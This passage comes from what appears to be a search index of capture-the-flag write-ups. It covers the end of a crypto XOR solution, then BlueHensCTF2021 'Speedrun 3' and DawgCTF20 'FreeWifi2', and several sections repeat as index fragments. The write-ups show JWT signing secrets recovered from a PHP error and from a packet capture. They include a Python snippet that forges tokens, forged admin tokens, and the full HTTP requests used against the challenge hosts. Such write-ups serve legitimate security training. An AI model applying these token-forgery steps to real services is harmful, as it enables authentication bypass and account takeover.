bytes.fromhex(\"835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1\") key3 = bytes.fromhex(\"9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c\") key4 = bytes.fromhex(\"53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3\") key5 = bytes.fromhex(\"6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35\") flag = xor(KEY1, KEY2, key3, key4, key5) print(flag.decode()) UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/","text":"Speedrun 3 Description link Solution First, we enter the site and randomly fill in the input We then refresh it and see {\"admin\":false,\"name\":\"asd\"} We also note that a cookie, named authtoken was created, with the value eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJhc2QifQ.i9II9riAxP5OSQrVDrRX2dOnNaJI_K4Vk9FED-ADuVs We play around with the cookie by deleting half of it, and was greeted with an error Fatal error: Uncaught UnexpectedValueException: Wrong number of segments in /var/www/html/index.php:84 Stack trace: #0 /var/www/html/index.php(531): Firebase\\JWT\\JWT::decode('eyJ0eXAiOiJKV1Q...', '82a59879a507', Array) #1 {main} thrown in /var/www/html/index.php on line 84 JWT When we google JWT decoder we get the link link We find that the format for the code is JWT::decode($payload, JWK::parseKeySet($jwks), $supportedAlgorithm); Hence, we input the 256-bit-secret as 82a59879a507 Now, it is verified Getting the flag We use the tool to change admin to true, and get eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFzZCJ9.YTbnlIIllCx5UyHp4N-M1f00hDl5erOGmq2V17N8RKg Flag is: UDCTF{st00p1d_PHP_err0r_mess4ges}","title":"Speedrun 3"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#speedrun-3","text":"","title":"Speedrun 3"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#description","text":"link","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#solution","text":"First, we enter the site and randomly fill in the input We then refresh it and see {\"admin\":false,\"name\":\"asd\"} We also note that a cookie, named authtoken was created, with the value eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJhc2QifQ.i9II9riAxP5OSQrVDrRX2dOnNaJI_K4Vk9FED-ADuVs We play around with the cookie by deleting half of it, and was greeted with an error Fatal error: Uncaught UnexpectedValueException: Wrong number of segments in /var/www/html/index.php:84 Stack trace: #0 /var/www/html/index.php(531): Firebase\\JWT\\JWT::decode('eyJ0eXAiOiJKV1Q...', '82a59879a507', Array) #1 {main} thrown in /var/www/html/index.php on line 84","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#jwt","text":"When we google JWT decoder we get the link link We find that the format for the code is JWT::decode($payload, JWK::parseKeySet($jwks), $supportedAlgorithm); Hence, we input the 256-bit-secret as 82a59879a507 Now, it is verified","title":"JWT"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#getting-the-flag","text":"We use the tool to change admin to true, and get eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFzZCJ9.YTbnlIIllCx5UyHp4N-M1f00hDl5erOGmq2V17N8RKg","title":"Getting the flag"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#flag-is","text":"UDCTF{st00p1d_PHP_err0r_mess4ges}","title":"Flag is:"},{"location":"web/DawgCTF20/freewifi2/","text":"FreeWifi2 There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: < JWT 'identity'=31337 > HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&username=true.grit%40umbccd.io&password=true.grit%40umbccd.io&submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666 Ideas: I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'=\"dawgCTF?heckin#bamboozle\"; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Freewifi2"},{"location":"web/DawgCTF20/freewifi2/#freewifi2","text":"There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: < JWT 'identity'=31337 > HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&username=true.grit%40umbccd.io&password=true.grit%40umbccd.io&submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666","title":"FreeWifi2"},{"location":"web/DawgCTF20/freewifi2/#ideas","text":"I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'=\"dawgCTF?heckin#bamboozle\"; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Ideas:"}]}